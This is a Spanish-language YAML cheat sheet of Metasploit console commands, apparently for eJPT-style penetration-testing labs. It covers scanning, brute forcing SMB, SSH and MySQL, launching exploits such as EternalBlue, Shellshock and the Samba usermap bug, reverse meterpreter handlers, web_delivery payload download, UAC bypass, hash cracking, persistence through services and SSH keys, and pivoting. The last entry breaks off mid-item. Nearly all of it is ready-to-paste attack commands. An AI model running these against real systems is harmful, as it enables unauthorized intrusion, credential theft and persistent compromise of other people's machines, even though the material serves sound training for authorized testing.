# Comandos de msfconsole: base de datos, módulos auxiliares, exploits, handlers, post y pivoting.
# Cada línea es un comando de la consola: se pegan tal cual en msfconsole.
tool: metasploit
area: metasploit
url: https://docs.metasploit.com/
prompt: msf
commands:
  - id: msf-start
    title: Arrancar Metasploit con su base de datos
    cmd: |
      sudo msfdb init && msfconsole -q
    prompt: shell
    phase: recon
    tags: [database]
    notes: >-
      msfdb init arranca PostgreSQL y crea la base de datos la primera vez; las siguientes solo
      comprueba que está en marcha. Sin base de datos no se guardan hosts, servicios ni credenciales.
      Dentro de la consola, db_status confirma la conexión.
    refs: [https://docs.metasploit.com/docs/using-metasploit/intermediate/metasploit-database-support.html]

  - id: msf-workspace
    title: Workspace propio para cada objetivo
    cmd: |
      db_status
      workspace -a ejpt
    phase: recon
    tags: [database]
    notes: >-
      Cada workspace tiene sus propios hosts, servicios, credenciales y loot. workspace a secas los
      lista (el activo lleva un asterisco) y workspace nombre cambia de uno a otro.

  - id: msf-setg
    title: Fijar el objetivo y tu IP para todos los módulos
    cmd: |
      setg RHOSTS {{RHOST}}
      setg LHOST {{LHOST}}
    phase: recon
    tags: [database]
    notes: >-
      set vale solo para el módulo cargado; setg, para todos hasta que cierres la consola. Es la
      causa típica de un módulo que ataca al host equivocado: al cambiar de objetivo, unsetg RHOSTS.

  - id: msf-db-nmap
    title: nmap guardando el resultado en la base de datos
    cmd: |
      db_nmap -sS -sV -O -p- --min-rate 5000 {{RHOST}}
    phase: recon
    tags: [port-scan, database]
    notes: >-
      Acepta las mismas opciones que nmap y guarda hosts, puertos y versiones en el workspace activo.
      Si ya conoces los puertos abiertos, cambia -p- por -pPORTS y ahorra minutos.
    refs: [https://nmap.org/book/man.html]

  - id: msf-db-import
    title: Importar un escaneo de nmap o Nessus
    cmd: |
      db_import nmap/full.xml
    phase: recon
    tags: [port-scan, database, vuln-scan]
    notes: >-
      Lee el XML de nmap (-oX o -oA) y los .nessus de Nessus, entre otros formatos. Por eso conviene
      guardar siempre la salida de los escaneos que lanzas fuera de la consola.

  - id: msf-db-query
    title: Hosts, servicios, vulnerabilidades y credenciales guardados
    cmd: |
      hosts
      services -u
      vulns
      creds
    phase: enum
    tags: [database]
    notes: >-
      services -u muestra solo los puertos abiertos, -p 445 filtra por puerto y -S http por texto.
      Con -R, hosts y services copian el resultado a RHOSTS: services -p 445 -R y el siguiente módulo
      ya apunta a todos los equipos con SMB.

  - id: msf-search
    title: Buscar módulos por tipo, plataforma, CVE o nombre
    cmd: |
      search type:exploit platform:windows smb
    phase: enum
    tags: [exploit-search]
    notes: >-
      Filtros útiles: type (exploit, auxiliary, post), platform, cve:2017-0144, name:, port:445 y
      rank:excellent. Después, use 3 carga el resultado número 3 de la última búsqueda.
    refs: [https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html]

  - id: msf-portscan-tcp
    title: Escaneo de puertos TCP con un módulo auxiliar
    cmd: |
      use auxiliary/scanner/portscan/tcp
      set RHOSTS {{SUBNET}}
      set PORTS 21,22,25,80,110,139,443,445,3306,3389,5985,8080
      set THREADS 50
      run
    phase: recon
    tags: [port-scan, tcp, pivoting]
    notes: >-
      Más lento que nmap, pero viaja por las rutas de Metasploit: después de un autoroute es la forma
      directa de escanear una red interna que tu máquina no alcanza.
    refs: [https://www.rapid7.com/db/modules/auxiliary/scanner/portscan/tcp/]

  - id: msf-smb-version
    title: Versión de SMB y sistema operativo de una red
    cmd: |
      use auxiliary/scanner/smb/smb_version
      set RHOSTS {{SUBNET}}
      run
    phase: enum
    tags: [smb, os-detection]
    notes: >-
      Dice la versión de Windows o Samba, el dominio y si el equipo aún habla SMBv1, la puerta de
      EternalBlue. Un Windows 7 o un Server 2008 sin parchear son los candidatos clásicos.
    refs: [https://www.rapid7.com/db/modules/auxiliary/scanner/smb/smb_version/]

  - id: msf-smb-ms17-010
    title: Comprobar si un equipo es vulnerable a EternalBlue
    cmd: |
      use auxiliary/scanner/smb/smb_ms17_010
      set RHOSTS {{SUBNET}}
      run
    phase: enum
    tags: [smb, ms17-010, vuln-scan]
    notes: >-
      No explota nada: pregunta por una transacción que solo responde de cierta forma si falta el
      parche MS17-010. Un "Host is likely VULNERABLE" es la señal para usar el exploit.
    refs: [https://www.rapid7.com/db/modules/auxiliary/scanner/smb/smb_ms17_010/]

  - id: msf-smb-enumshares
    title: Recursos compartidos por SMB
    cmd: |
      use auxiliary/scanner/smb/smb_enumshares
      set RHOSTS {{RHOST}}
      run
    phase: enum
    tags: [smb]
    notes: >-
      Sin usuario prueba la sesión nula. Con credenciales, añade set SMBUser y set SMBPass antes de
      run. Los recursos que no son ADMIN$, C$ ni IPC$ son los que hay que revisar a mano.
    refs: [https://www.rapid7.com/db/modules/auxiliary/scanner/smb/smb_enumshares/]

  - id: msf-smb-enumusers
    title: Usuarios locales por SMB
    cmd: |
      use auxiliary/scanner/smb/smb_enumusers
      set RHOSTS {{RHOST}}
      run
    phase: enum
    tags: [smb]
    notes: >-
      Pide la lista de usuarios por SAMR. Si la sesión nula no basta, smb_lookupsid prueba los RID uno
      a uno (RID cycling) y suele sacar los mismos nombres. La lista va a users.txt para smb_login.
    refs: [https://www.rapid7.com/db/modules/auxiliary/scanner/smb/smb_enumusers/]

  - id: msf-smb-login
    title: Probar credenciales por SMB
    cmd: |
      use auxiliary/scanner/smb/smb_login
      set RHOSTS {{RHOST}}
      set USER_FILE users.txt
      set PASS_FILE {{WORDLIST}}
      set STOP_ON_SUCCESS true
      set VERBOSE false
      run
    phase: credential-access
    tags: [smb, brute-force]
    notes: >-
      Cada acierto queda en creds. Una política de bloqueo de cuentas puede dejar sin acceso a los
      usuarios reales: para spraying, una sola contraseña con SMBPass en vez de PASS_FILE.
    refs: [https://www.rapid7.com/db/modules/auxiliary/scanner/smb/smb_login/]

  - id: msf-ftp-anonymous
    title: Comprobar el login anónimo en FTP
    cmd: |
      use auxiliary/scanner/ftp/anonymous
      set RHOSTS {{RHOST}}
      run
    phase: enum
    tags: [ftp]
    notes: >-
      Dice si entra y si tiene permiso de lectura o también de escritura. Un FTP escribible en la
      carpeta que sirve la web es una webshell a un paso. El banner trae la versión exacta.
    refs: [https://www.rapid7.com/db/modules/auxiliary/scanner/ftp/anonymous/]

  - id: msf-ssh-login
    title: Fuerza bruta de SSH con los diccionarios de Metasploit
    cmd: |
      use auxiliary/scanner/ssh/ssh_login
      set RHOSTS {{RHOST}}
      set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
      set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
      set STOP_ON_SUCCESS true
      run
    phase: credential-access
    tags: [ssh, brute-force]
    notes: >-
      Cada login válido abre una sesión de shell. Metasploit trae diccionarios cortos en
      data/wordlists (unix_users, unix_passwords, common_users...), pensados para laboratorios.
    refs: [https://www.rapid7.com/db/modules/auxiliary/scanner/ssh/ssh_login/]

  - id: msf-http-dir-scanner
    title: Directorios de una web con un módulo auxiliar
    cmd: |
      use auxiliary/scanner/http/dir_scanner
      set RHOSTS {{RHOST}}
      run
    phase: enum
    tags: [http]
    notes: >-
      Usa el diccionario de WMAP (data/wmap/wmap_dirs.txt). Para HTTPS, set RPORT 443 y set SSL true.
      Si encuentra una carpeta que acepta PUT, http_put sube un archivo.
    refs: [https://www.rapid7.com/db/modules/auxiliary/scanner/http/dir_scanner/]

  - id: msf-mysql-login
    title: Fuerza bruta de MySQL
    cmd: |
      use auxiliary/scanner/mysql/mysql_login
      set RHOSTS {{RHOST}}
      set USERNAME root
      set PASS_FILE {{WORDLIST}}
      set STOP_ON_SUCCESS true
      set VERBOSE false
      run
    phase: credential-access
    tags: [mysql, brute-force]
    notes: >-
      root con una contraseña débil es un clásico de laboratorio. Prueba también BLANK_PASSWORDS true:
      root sin contraseña sigue apareciendo.
    refs: [https://www.rapid7.com/db/modules/auxiliary/scanner/mysql/mysql_login/]

  - id: msf-mysql-enum
    title: Enumerar MySQL con credenciales
    cmd: |
      use auxiliary/admin/mysql/mysql_enum
      set RHOSTS {{RHOST}}
      set USERNAME {{USER}}
      set PASSWORD '{{PASS}}'
      run
    phase: enum
    tags: [mysql]
    notes: >-
      Versión, usuarios con sus hashes, privilegios y configuración. Con las mismas opciones,
      mysql_sql ejecuta una consulta (SQL), mysql_schemadump vuelca el esquema y mysql_hashdump los
      hashes.
    refs: [https://www.rapid7.com/db/modules/auxiliary/admin/mysql/mysql_enum/]

  - id: msf-smtp-enum
    title: Usuarios de un servidor SMTP
    cmd: |
      use auxiliary/scanner/smtp/smtp_enum
      set RHOSTS {{RHOST}}
      run
    phase: enum
    tags: [smtp]
    notes: >-
      Prueba cada nombre de data/wordlists/unix_users.txt con VRFY o RCPT TO. Los usuarios que existen
      son candidatos para la fuerza bruta de SSH o FTP del mismo equipo.
    refs: [https://www.rapid7.com/db/modules/auxiliary/scanner/smtp/smtp_enum/]

  - id: msf-wmap
    title: Escaneo de vulnerabilidades web con WMAP
    cmd: |
      load wmap
      wmap_sites -a {{URL}}
      wmap_targets -t {{URL}}
      wmap_run -t
      wmap_run -e
    phase: enum
    tags: [http, vuln-scan]
    notes: >-
      wmap_run -t enseña los módulos que va a lanzar y -e los lanza. Al terminar, wmap_vulns -l y
      vulns resumen lo encontrado. Ruidoso y básico: una pista para seguir a mano, no un informe.

  - id: msf-handler
    title: Handler para recibir un payload (multi/handler)
    cmd: |
      use exploit/multi/handler
      set PAYLOAD windows/x64/meterpreter/reverse_tcp
      set LHOST {{LHOST}}
      set LPORT {{LPORT}}
      set ExitOnSession false
      run -j
    phase: initial-access
    tags: [handler, reverse-shell]
    notes: >-
      PAYLOAD tiene que ser exactamente el del msfvenom, con la barra o el guion bajo incluidos. Con
      ExitOnSession false y run -j se queda escuchando en segundo plano y recoge todas las sesiones
      que lleguen; jobs las lista y jobs -k para el handler.
    refs: [https://www.rapid7.com/db/modules/exploit/multi/handler/]

  - id: msf-handler-oneliner
    title: Handler en una línea desde la terminal
    cmd: |
      msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST {{LHOST}}; set LPORT {{LPORT}}; run"
    prompt: shell
    phase: initial-access
    tags: [handler, reverse-shell]
    notes: >-
      -x ejecuta los comandos separados por punto y coma al arrancar. Cambia PAYLOAD por el que hayas
      generado. Para reutilizarlo, guárdalo en un .rc y lánzalo con msfconsole -q -r handler.rc.

  - id: msf-eternalblue
    title: EternalBlue (MS17-010)
    cmd: |
      use exploit/windows/smb/ms17_010_eternalblue
      set RHOSTS {{RHOST}}
      set LHOST {{LHOST}}
      set LPORT {{LPORT}}
      run
    phase: initial-access
    tags: [smb, ms17-010]
    notes: >-
      Desbordamiento en el driver de SMBv1 del kernel: sin credenciales y directo a SYSTEM. Puede
      tumbar el equipo con un pantallazo azul, sobre todo en Windows 7 y Server 2008; confirma antes
      con smb_ms17_010.
    refs: [https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/]

  - id: msf-psexec
    title: PsExec con pass-the-hash
    cmd: |
      use exploit/windows/smb/psexec
      set RHOSTS {{RHOST}}
      set SMBUser {{USER}}
      set SMBPass aad3b435b51404eeaad3b435b51404ee:{{HASH}}
      set LHOST {{LHOST}}
      set LPORT {{LPORT}}
      run
    phase: lateral
    tags: [smb, pass-the-hash, ntlm]
    notes: >-
      SMBPass acepta la contraseña o el par LM:NT de un hashdump; la parte LM vacía es siempre
      aad3b435b51404eeaad3b435b51404ee. La cuenta tiene que ser administradora del equipo. Instala un
      servicio, así que deja un evento 7045 y vuelve como SYSTEM.
    refs: [https://www.rapid7.com/db/modules/exploit/windows/smb/psexec/]

  - id: msf-winrm-script-exec
    title: Shell por WinRM con credenciales
    cmd: |
      use exploit/windows/winrm/winrm_script_exec
      set RHOSTS {{RHOST}}
      set USERNAME {{USER}}
      set PASSWORD '{{PASS}}'
      set FORCE_VBS true
      set LHOST {{LHOST}}
      run
    phase: lateral
    tags: [winrm]
    notes: >-
      Para el 5985. Las credenciales salen de auxiliary/scanner/winrm/winrm_login. FORCE_VBS evita el
      método de PowerShell, que falla a menudo. Con credenciales, evil-winrm da una shell más estable.
    refs: [https://www.rapid7.com/db/modules/exploit/windows/winrm/winrm_script_exec/]

  - id: msf-hfs
    title: Rejetto HFS 2.3 (HttpFileServer)
    cmd: |
      use exploit/windows/http/rejetto_hfs_exec
      set RHOSTS {{RHOST}}
      set LHOST {{LHOST}}
      set LPORT {{LPORT}}
      run
    phase: initial-access
    tags: [http, rce]
    notes: >-
      CVE-2014-6287: un byte nulo en la búsqueda se salta el filtro de macros de HFS y ejecuta
      comandos. La versión sale en la cabecera Server o en el pie de la página.
    refs: [https://www.rapid7.com/db/modules/exploit/windows/http/rejetto_hfs_exec/]

  - id: msf-iis-webdav
    title: Subir una webshell ASP por WebDAV en IIS
    cmd: |
      use exploit/windows/iis/iis_webdav_upload_asp
      set RHOSTS {{RHOST}}
      set HttpUsername {{USER}}
      set HttpPassword '{{PASS}}'
      set PATH /webdav/shell.asp
      set LHOST {{LHOST}}
      run
    phase: initial-access
    tags: [http, webdav]
    notes: >-
      Sube el payload como .txt, lo renombra a .asp con MOVE y lo pide para ejecutarlo. Hacen falta
      credenciales de WebDAV (fuerza bruta con hydra o http_login) y que IIS ejecute ASP; davtest lo
      comprueba antes.
    refs: [https://www.rapid7.com/db/modules/exploit/windows/iis/iis_webdav_upload_asp/]

  - id: msf-vsftpd-backdoor
    title: vsftpd 2.3.4 con puerta trasera
    cmd: |
      use exploit/unix/ftp/vsftpd_234_backdoor
      set RHOSTS {{RHOST}}
      run
    phase: initial-access
    tags: [ftp, backdoor]
    notes: >-
      Un usuario que acaba en :) abre una shell de root en el puerto 6200 y el módulo se conecta a
      ella: no necesita LHOST. Da una shell simple; sessions -u la convierte en meterpreter.
    refs: [https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor/]

  - id: msf-samba-usermap
    title: Samba 3.0.20 a 3.0.25 (usermap_script)
    cmd: |
      use exploit/multi/samba/usermap_script
      set RHOSTS {{RHOST}}
      set LHOST {{LHOST}}
      run
    phase: initial-access
    tags: [smb, rce]
    notes: >-
      CVE-2007-2447: con username map script activo, Samba pasa el nombre de usuario a la shell sin
      limpiarlo, así que unas comillas invertidas en el nombre ejecutan comandos como root.
    refs: [https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script/]

  - id: msf-shellshock
    title: Shellshock en un script CGI
    cmd: |
      use exploit/multi/http/apache_mod_cgi_bash_env_exec
      set RHOSTS {{RHOST}}
      set TARGETURI /cgi-bin/test.cgi
      set LHOST {{LHOST}}
      set LPORT {{LPORT}}
      run
    phase: initial-access
    tags: [http, shellshock, rce]
    notes: >-
      CVE-2014-6271: Apache pasa las cabeceras al CGI como variables de entorno y un Bash vulnerable
      ejecuta lo que va detrás de una definición de función. TARGETURI tiene que ser un CGI que exista;
      búscalo en /cgi-bin/ o en el código de la página.
    refs: [https://www.rapid7.com/db/modules/exploit/multi/http/apache_mod_cgi_bash_env_exec/]

  - id: msf-web-delivery
    title: Meterpreter sin subir archivos (web_delivery)
    cmd: |
      use exploit/multi/script/web_delivery
      set TARGET 2
      set PAYLOAD windows/x64/meterpreter/reverse_tcp
      set LHOST {{LHOST}}
      set LPORT {{LPORT}}
      run -j
    phase: initial-access
    tags: [handler, powershell]
    notes: >-
      Levanta un servidor web y un handler e imprime el comando que hay que ejecutar en el objetivo,
      que baja el payload y lo carga en memoria. TARGET 2 es PowerShell; show targets lista Python,
      PHP, Regsvr32 y Linux.
    refs: [https://www.rapid7.com/db/modules/exploit/multi/script/web_delivery/]

  - id: msf-shell-to-meterpreter
    title: Convertir una shell en meterpreter
    cmd: |
      use post/multi/manage/shell_to_meterpreter
      set SESSION 1
      set LHOST {{LHOST}}
      run
    phase: initial-access
    tags: [meterpreter, reverse-shell]
    notes: >-
      Crea una sesión meterpreter nueva a partir de la shell 1 (sessions -l da el número); la shell
      sigue abierta. El atajo es sessions -u 1; el módulo deja elegir LHOST si el atajo falla.
    refs: [https://www.rapid7.com/db/modules/post/multi/manage/shell_to_meterpreter/]

  - id: msf-bypassuac
    title: Saltarse UAC para tener una sesión elevada
    cmd: |
      use exploit/windows/local/bypassuac_injection
      set SESSION 1
      set TARGET 1
      set PAYLOAD windows/x64/meterpreter/reverse_tcp
      set LHOST {{LHOST}}
      set LPORT {{LPORT}}
      run
    phase: privesc
    tags: [uac-bypass]
    notes: >-
      Para un usuario del grupo Administradores en una sesión sin elevar (getsystem falla). TARGET 1
      es x64 y tiene que casar con la sesión. Si hay un handler escuchando en LPORT, usa otro puerto.
      Alternativas: bypassuac_fodhelper y bypassuac_eventvwr.
    refs: [https://www.rapid7.com/db/modules/exploit/windows/local/bypassuac_injection/]

  - id: msf-chkrootkit
    title: Root con chkrootkit 0.49 ejecutado por cron
    cmd: |
      use exploit/unix/local/chkrootkit
      set SESSION 1
      set CHKROOTKIT /bin/chkrootkit
      set LHOST {{LHOST}}
      set LPORT {{LPORT}}
      run
    phase: privesc
    tags: [cron, local-exploits]
    notes: >-
      CVE-2014-0476: chkrootkit anterior a 0.50 ejecuta /tmp/update si existe. El módulo lo deja ahí y
      espera a que el cron de root lance chkrootkit, que puede tardar minutos. Pon en CHKROOTKIT la
      ruta que dé which chkrootkit.
    refs: [https://www.rapid7.com/db/modules/exploit/unix/local/chkrootkit/]

  - id: msf-crack-windows
    title: Crackear los hashes NTLM guardados en creds
    cmd: |
      use auxiliary/analyze/crack_windows
      set CUSTOM_WORDLIST {{WORDLIST}}
      run
    phase: credential-access
    tags: [hash-cracking, ntlm]
    notes: >-
      Lee los hashes que hashdump dejó en la base de datos, lanza John the Ripper y guarda cada
      contraseña en claro en creds. Sin base de datos no encuentra nada que crackear.
    refs: [https://www.rapid7.com/db/modules/auxiliary/analyze/crack_windows/]

  - id: msf-crack-linux
    title: Crackear los hashes de /etc/shadow guardados en creds
    cmd: |
      use auxiliary/analyze/crack_linux
      set CUSTOM_WORDLIST {{WORDLIST}}
      set SHA512 true
      run
    phase: credential-access
    tags: [hash-cracking]
    notes: >-
      Los formatos lentos vienen desactivados: los hashes $6$ (SHA-512, lo normal hoy) necesitan
      SHA512 true y los $5$, SHA256 true. Sin eso, termina sin error y sin crackear nada.
    refs: [https://www.rapid7.com/db/modules/auxiliary/analyze/crack_linux/]

  - id: msf-persistence-service
    title: Persistencia como servicio de Windows
    cmd: |
      use exploit/windows/local/persistence_service
      set SESSION 1
      set PAYLOAD windows/meterpreter/reverse_tcp
      set LHOST {{LHOST}}
      set LPORT {{LPORT}}
      run
    phase: persistence
    tags: [persistence]
    notes: >-
      Sube un ejecutable y lo instala como servicio de arranque automático: tras un reinicio vuelve
      como SYSTEM a un multi/handler con el mismo payload. En versiones recientes se llama
      exploit/windows/persistence/service. Solo con permiso, y apunta lo que dejas para quitarlo.
    refs: [https://www.rapid7.com/db/modules/exploit/windows/local/persistence_service/]

  - id: msf-ssh-key-persistence
    title: Persistencia con una clave SSH
    cmd: |
      use post/linux/manage/sshkey_persistence
      set SESSION 1
      set CREATESSHFOLDER true
      run
    phase: persistence
    tags: [persistence, ssh]
    notes: >-
      Añade una clave pública a authorized_keys (de todos los usuarios, o de USERNAME) y guarda la
      privada en loot. Después, chmod 600 a esa clave y ssh -i. En versiones recientes se llama
      exploit/multi/persistence/ssh_key; el nombre antiguo sigue funcionando.
    refs: [https://www.rapid7.com/db/modules/post/linux/manage/sshkey_persistence/]

  - id: msf-route
    title: Ruta manual hacia una red interna por una sesión
    cmd: |
      route add {{SUBNET}} 1
      route print
    phase: lateral
    tags: [pivoting, routing]
    notes: >-
      Todo módulo que apunte a esa red saldrá por la sesión 1. Es lo mismo que hace autoroute, pero a
      mano: útil cuando la red no aparece en la tabla de rutas del equipo comprometido.

  - id: msf-socks-proxy
    title: Proxy SOCKS para usar tus herramientas a través del pivot
    cmd: |
      use auxiliary/server/socks_proxy
      set SRVPORT 9050
      set VERSION 4a
      run -j
    phase: lateral
    tags: [pivoting, proxychains, socks]
    notes: >-
